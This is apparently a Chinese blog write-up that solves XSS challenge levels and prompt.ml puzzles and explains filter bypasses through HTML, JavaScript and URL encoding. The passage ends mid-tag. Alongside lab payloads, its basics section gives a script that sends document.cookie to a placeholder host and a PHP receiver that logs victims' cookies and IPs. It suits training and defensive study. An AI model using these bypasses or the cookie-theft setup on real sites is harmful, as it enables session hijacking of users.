      <link href="/posts/88edfa78/"/>
      <url>/posts/88edfa78/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h2><p>(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.ctf8.com&#x2F;level1.php?name&#x3D;%3Cscript%3Ealert(1)%3C&#x2F;script%3E</span><br></pre></td></tr></table></figure><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没有找到和&lt;&#x2F;h2&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;h2&gt;相关的结果.</span><br></pre></td></tr></table></figure><p>但是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;没有找到和&lt;scRipt&gt;alert(1)&lt;&#x2F;script&gt;相关的结果.&lt;&#x2F;h2&gt;&lt;center&gt; &lt;form action&#x3D;level2.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;&lt;scRipt&gt;alert(1)&lt;&#x2F;script&gt;&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="level3-js事件绕过"><a href="#level3-js事件绕过" class="headerlink" title="level3 js事件绕过"></a>level3 js事件绕过</h3><p>这次两个都被转义了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;没有找到和&lt;script&gt;alert(1)&lt;&#x2F;script&gt;相关的结果.&lt;&#x2F;h2&gt;&lt;center&gt; &lt;form action&#x3D;level3.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&#39;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>那就不用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;onmouseover&#x3D;&#39;alert(1)</span><br></pre></td></tr></table></figure><p>提交之后鼠标悬浮到上面即可触发</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;没有找到和&lt;script&gt;alert(1)&lt;&#x2F;script&gt;相关的结果.&lt;&#x2F;h2&gt;&lt;center&gt; &lt;form action&#x3D;level4.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;scriptalert(1)&#x2F;script&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>同样的绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="level5-a标签绕过"><a href="#level5-a标签绕过" class="headerlink" title="level5 a标签绕过"></a>level5 a标签绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;没有找到和&lt;script&gt;alert(1)&lt;&#x2F;script&gt;相关的结果.&lt;&#x2F;h2&gt;&lt;center&gt; &lt;form action&#x3D;level5.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;&lt;scr_ipt&gt;alert(1)&lt;&#x2F;script&gt;&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>但是现在会被过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;o_nmouseover&#x3D;&#39;alert(1)&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>那么事件不能用了</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1);&quot;&gt;aaa&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/88edfa78/1581324449393.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1);&quot;&gt;aaa&lt;&#x2F;a&gt;&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align&#x3D;center&gt;没有找到和&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;相关的结果.&lt;&#x2F;h2&gt;&lt;center&gt; &lt;form action&#x3D;level6.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;&lt;img sr_c&#x3D;x o_nerror&#x3D;alert(1)&gt;&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;       &lt;h2 align&#x3D;center&gt;没有找到和&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(1);&quot;&gt;aaa&lt;&#x2F;a&gt;相关的结果.&lt;&#x2F;h2&gt;&lt;center&gt; &lt;form action&#x3D;level6.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;&quot;&gt;&lt;a hr_ef&#x3D;&quot;javascript:alert(1);&quot;&gt;aaa&lt;&#x2F;a&gt;&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>payload：(大写可以绕过)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(&#x2F;1&#x2F;)&quot;&gt;axxx&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;level7.php method&#x3D;GET&gt; &lt;input name&#x3D;keyword  value&#x3D;&quot;&lt;&gt;alert(1)&lt;&#x2F;&gt;&quot;&gt; &lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt; &lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><code>script</code> , <code>on</code>被过滤</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonninput&#x3D;alert(1) &quot; &quot;oonnmouseover&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><p>然后输入即可</p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>将 <code>javascript:alert(1)</code>  html实体编码即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>将 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p>html实体编码，然后加上 <code>%0d</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x0a;%0dhttp:&#x2F;&#x2F;www.0aa.me%0dalert(1)</span><br></pre></td></tr></table></figure><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>这一关有点玄学</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort&#x3D;&quot; type&#x3D;&quot;text&quot;onmouseover&#x3D;alert&#96;1&#96; &quot;</span><br></pre></td></tr></table></figure><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>添加 referer </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/88edfa78/1582880021264.png" alt="img"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>在User-agent 处注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>在cookie处注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>iframe 引入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe name&#x3D;&quot;leftframe&quot; marginwidth&#x3D;10 marginheight&#x3D;10 src&#x3D;&quot;http:&#x2F;&#x2F;www.exifviewer.org&#x2F;&quot; frameborder&#x3D;no width&#x3D;&quot;80%&quot; scrolling&#x3D;&quot;no&quot; height&#x3D;80%&gt;&lt;&#x2F;iframe&gt;&lt;&#x2F;center&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>angular js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss_test&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>%0a 绕过空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xss_test&#x2F;level16.php?keyword&#x3D;%3Cimg%0asrc&#x3D;1%0aonerror&#x3D;alert(1)%3E</span><br></pre></td></tr></table></figure><p>level17-20 都是flash相关的xss，就不写了</p><h2 id="prompt1-to-win"><a href="#prompt1-to-win" class="headerlink" title="prompt1 to win"></a>prompt1 to win</h2><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p><h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;     &#x2F;&#x2F; tags stripping mechanism from ExtJS library     &#x2F;&#x2F; Ext.util.Format.stripTags     var stripTagsRE &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi;     input &#x3D; input.replace(stripTagsRE, &#39;&#39;);      return &#39;&lt;article&gt;&#39; + input + &#39;&lt;&#x2F;article&gt;&#39;; &#125;</span><br></pre></td></tr></table></figure><p>不能闭合标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&#x2F;onload&#x3D;prompt(1)&#x2F;&#x2F; &lt;body onload&#x3D;prompt(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><code>onload</code> 事件属性，在页面加载之后立即执行一段JavaScript</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;     &#x2F;&#x2F;                      v-- frowny face     input &#x3D; input.replace(&#x2F;[&#x3D;(]&#x2F;g, &#39;&#39;);      &#x2F;&#x2F; ok seriously, disallows equal signs and open parenthesis     return input; &#125;</span><br></pre></td></tr></table></figure><p>使用svg即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;&#x2F;script&gt;  &lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;     &#x2F;&#x2F; filter potential comment end delimiters     input &#x3D; input.replace(&#x2F;-&gt;&#x2F;g, &#39;_&#39;);      &#x2F;&#x2F; comment the input to avoid script execution     return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;; &#125;</span><br></pre></td></tr></table></figure><p>新姿势get</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;prompt(1)&lt;&#x2F;script</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; make sure the script belongs to own site</span><br><span class="line">    &#x2F;&#x2F; sample script: http:&#x2F;&#x2F;prompt.ml&#x2F;js&#x2F;test.js</span><br><span class="line">    if (&#x2F;^(?:https?:)?\&#x2F;\&#x2F;prompt\.ml\&#x2F;&#x2F;i.test(decodeURIComponent(input))) &#123;</span><br><span class="line">        var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">        script.src &#x3D; input;</span><br><span class="line">        return script.outerHTML;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &#39;Invalid resource.&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    &#x2F;&#x2F; apply strict filter rules of level 0</span><br><span class="line">    &#x2F;&#x2F; filter &quot;&gt;&quot; and event handlers</span><br><span class="line">    input &#x3D; input.replace(&#x2F;&gt;|on.+?&#x3D;|focus&#x2F;gi, &#39;_&#39;);</span><br><span class="line"></span><br><span class="line">    return &#39;&lt;input value&#x3D;&quot;&#39; + input + &#39;&quot; type&#x3D;&quot;text&quot;&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新姿势。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;type&#x3D;image src onerror</span><br><span class="line">&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;type&#x3D;image src onerror</span><br><span class="line">&#x3D;prompt(1)</span><br></pre></td></tr></table></figure><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;     &#x2F;&#x2F; let&#39;s do a post redirection     try &#123;         &#x2F;&#x2F; pass in formURL#formDataJSON         &#x2F;&#x2F; e.g. http:&#x2F;&#x2F;httpbin.org&#x2F;post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;         var segments &#x3D; input.split(&#39;#&#39;);         var formURL &#x3D; segments[0];         var formData &#x3D; JSON.parse(segments[1]);          var form &#x3D; document.createElement(&#39;form&#39;);         form.action &#x3D; formURL;         form.method &#x3D; &#39;post&#39;;          for (var i in formData) &#123;             var input &#x3D; form.appendChild(document.createElement(&#39;input&#39;));             input.name &#x3D; i;             input.setAttribute(&#39;value&#39;, formData[i]);         &#125;          return form.outerHTML + &#39;                         \n\ &lt;script&gt;                                                  \n\     &#x2F;&#x2F; forbid javascript: or vbscript: and data: stuff    \n\     if (!&#x2F;script:|data:&#x2F;i.test(document.forms[0].action)) \n\         document.forms[0].submit();                       \n\     else                                                  \n\         document.write(&quot;Action forbidden.&quot;)               \n\ &lt;&#x2F;script&gt;                                                 \n\         &#39;;     &#125; catch (e) &#123;         return &#39;Invalid form data.&#39;;     &#125; &#125;</span><br></pre></td></tr></table></figure><p>代码很复杂，但是其实就是一个构造表单的过程</p><p><img src= "/img/loading.gif" data-src="/posts/88edfa78/1582896974234.png" alt="img"></p><p>如果使用JavaScript伪协议，被过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;test&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>新姿势：</p><p>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</p><p>所以如果输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>得到的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;javascript:prompt(1)&quot; method&#x3D;&quot;post&quot;&gt;&lt;input name&#x3D;&quot;action&quot; value&#x3D;&quot;1&quot;&gt;&lt;&#x2F;form&gt;                          &lt;script&gt;                                                       &#x2F;&#x2F; forbid javascript: or vbscript: and data: stuff         if (!&#x2F;script:|data:&#x2F;i.test(document.forms[0].action))          document.forms[0].submit();                            else                                                           document.write(&quot;Action forbidden.&quot;)                &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;     &#x2F;&#x2F; filter potential start-tags     input &#x3D; input.replace(&#x2F;&lt;([a-zA-Z])&#x2F;g, &#39;&lt;_$1&#39;);     &#x2F;&#x2F; use all-caps for heading     input &#x3D; input.toUpperCase();      &#x2F;&#x2F; sample input: you shall not pass! &#x3D;&gt; YOU SHALL NOT PASS!     return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;&#x2F;h1&gt;&#39;; &#125;</span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript&#x2F;ſrc&#x3D;&#x2F;&#x2F;⒕₨&gt;&lt;&#x2F;ſcript&gt;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/88edfa78/1582897922738.png" alt="img"></p><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;     &#x2F;&#x2F; (╯°□°）╯︵ ┻━┻     input &#x3D; encodeURIComponent(input).replace(&#x2F;prompt&#x2F;g, &#39;alert&#39;);     &#x2F;&#x2F; ┬──┬ •ノ( ゜-゜ノ) chill out bro     input &#x3D; input.replace(&#x2F;&#39;&#x2F;g, &#39;&#39;);      &#x2F;&#x2F; (╯°□°）╯︵ &#x2F;(.□. \）DONT FLIP ME BRO     return &#39;&lt;script&gt;&#39; + input + &#39;&lt;&#x2F;script&gt; &#39;; &#125;</span><br></pre></td></tr></table></figure><p>组合一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prom&#39;pt(1)</span><br></pre></td></tr></table></figure><h2 id="XSS基础知识"><a href="#XSS基础知识" class="headerlink" title="XSS基础知识"></a>XSS基础知识</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;xxxx&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>escape一般会进行URL编码，但是 该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p><p>常用的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;);&lt;&#x2F;script&gt; &#x2F;&#x2F;经典语句  &lt;BODY ONLOAD&#x3D;alert(&#39;XSS&#39;)&gt; &lt;img src&#x3D;x onerror&#x3D;alert(1)&gt; &lt;svg onload&#x3D;alert(1)&gt; &lt;a href &#x3D; javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="简单地XSS接收平台"><a href="#简单地XSS接收平台" class="headerlink" title="简单地XSS接收平台"></a>简单地XSS接收平台</h3><p>js脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; document.createElement(&quot;img&quot;); img.src &#x3D; &quot;http:&#x2F;&#x2F;xxx&#x2F;x.php?cookie&#x3D;&quot;+document.cookie; document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>接收端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   $victim &#x3D; &#39;XXS得到的 cookie:&#39;. $_SERVER[&#39;REMOTE_ADDR&#39;]. &#39;:&#39; .$_GET[&#39;cookie&#39;].&quot;\r\n\r\n&quot;;   echo htmlspecialchars($_GET[&#39;cookie&#39;]); $myfile &#x3D; fopen(&quot;&#x2F;aixi&#x2F;XSS&#x2F;xss_victim.txt&quot;, &quot;a&quot;); fwrite($myfile, $victim); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="从浏览器解码看xss"><a href="#从浏览器解码看xss" class="headerlink" title="从浏览器解码看xss"></a>从浏览器解码看xss</h3><h4 id="html编码解码"><a href="#html编码解码" class="headerlink" title="html编码解码"></a>html编码解码</h4><p>浏览器会先解析html，然后解析xss，所以，如果在xss中使用到了html实体编码是没有用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>但是却可以触发，原因是 svg支持xml,在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h4 id="JavaScript编码解码"><a href="#JavaScript编码解码" class="headerlink" title="JavaScript编码解码"></a>JavaScript编码解码</h4><p>下面无法触发，原因是浏览器看到 <code>onerror</code> 之后，调用js解析器，但是在js中，<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。所以对于防御来说，应该编码这些控制字符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</span><br></pre></td></tr></table></figure><p>所以我们需要修改成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</span><br></pre></td></tr></table></figure><p>结合上面的html编码，我们可以将 <code>\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)</code> 再进行一次html实体编码(这样就算你过滤了 <code>&#39;</code>,照样可以绕过)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&#39;&amp;#41;&gt;</span><br></pre></td></tr></table></figure><p>比如开发人员单纯的设置HTML实体编码为防御xss的手段，但是用户输入点确实在alert中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src &#x3D; &quot;https:&#x2F;&#x2F;text.com&quot; onclick &#x3D; &#39;alert(输入点)&#39;&gt;</span><br></pre></td></tr></table></figure><p>如果用户正常输入的话凡是存在<code>&lt;</code> ,<code>&quot;</code> 等都能被转码</p><p>但是攻击者可以通过语句<code>&quot;);alert(&quot;test</code> 然后HTML编码即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src &#x3D; &quot;https:&#x2F;&#x2F;gss1.bdstatic.com&quot; onclick &#x3D; &#39;alert(&quot;FIRST XSS | &amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)&#39;&gt;</span><br></pre></td></tr></table></figure><p>发现弹窗了两次,是因为服务端进行一个HTML解码发现存在两个<code>alert()</code>弹窗于是直接弹</p><p>所以对于这种情况，正确防御XSS的方法应该是先javascript编码然后再进行HTML编码</p><h4 id="URL编码解码"><a href="#URL编码解码" class="headerlink" title="URL编码解码"></a>URL编码解码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href &#x3D; 